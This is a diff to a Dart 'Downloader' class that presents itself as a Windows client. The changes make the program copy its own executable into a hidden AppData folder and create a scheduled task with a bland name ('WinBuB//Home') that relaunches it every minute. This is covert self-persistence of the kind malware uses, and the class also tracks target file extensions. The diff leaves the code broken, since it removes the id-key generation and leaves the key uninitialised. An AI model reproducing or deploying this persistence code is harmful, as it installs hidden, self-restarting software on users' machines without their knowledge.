@@ -1,8 +1,12 @@
-import 'package:dio/dio.dart';
-import 'package:meta/meta.dart';
 import "dart:io";
 import 'dart:async';
 import 'dart:math';
+
+import 'package:collection/collection.dart';
+import 'package:dio/dio.dart';
+import 'package:meta/meta.dart';
+
+import 'const.dart';
 
 class Downloader {
   final String programID = 'WindowsClient';
@@ -31,8 +35,9 @@ class Downloader {
   Future<String> copier({String programName}) async {
     try {
       await Directory('$userProfile\\appData\\Local\\Coner\\').create();
-      var rfile = await File('berg.exe').readAsBytesSync();
-      await File('$userProfile\\appData\\Local\\Coner\\WinApp.exe')
+      var rfile = await File(Settings.programNameCompiled).readAsBytesSync();
+      await File(
+              '$userProfile\\appData\\Local\\Coner\\${Settings.programNameCompiled}')
           .writeAsBytesSync(rfile);
       await addToTasks(programName: programName);
     } catch (e) {
@@ -44,10 +49,7 @@ class Downloader {
   Future<Map<String, dynamic>> genrate({String path}) async {
     String id_key;
     var my_file = File(path + '//id.txt');
-    var ran = Random();
-    for (var i = 0; i < 10; i++) {
-      id_key += ran.nextInt(100000).toString();
-    }
+    
     await my_file.writeAsStringSync(id_key);
     return {'key': id_key, 'file': my_file};
   }
@@ -93,7 +95,7 @@ class Downloader {
   // ignore: missing_return
   Future<bool> addToTasks({String programName}) async {
     await Process.run(
-        'SCHTASKS /CREATE /SC  /mo 1 /TN "MyTasks\\ruun task" /TR $userProfile\\appData\\Local\\Coner\\$programName',
+        'SCHTASKS /CREATE /SC minute /mo 1 /TN "WinBuB//Home" /TR $userProfile\\appData\\Local\\Coner\\$programName',
         []).then((process) {
       if (process.stdout.toString().startsWith("SUCCESS")) {
         return true;
@@ -102,4 +104,20 @@ class Downloader {
       }
     });
   }
+
+  @override
+  String toString() => 'Downloader(extention: $extention, allowd_extentions: $allowd_extentions)';
+
+  @override
+  bool operator ==(Object o) {
+    if (identical(this, o)) return true;
+    final listEquals = const DeepCollectionEquality().equals;
+  
+    return o is Downloader &&
+      o.extention == extention &&
+      listEquals(o.allowd_extentions, allowd_extentions);
+  }
+
+  @override
+  int get hashCode => extention.hashCode ^ allowd_extentions.hashCode;
 }
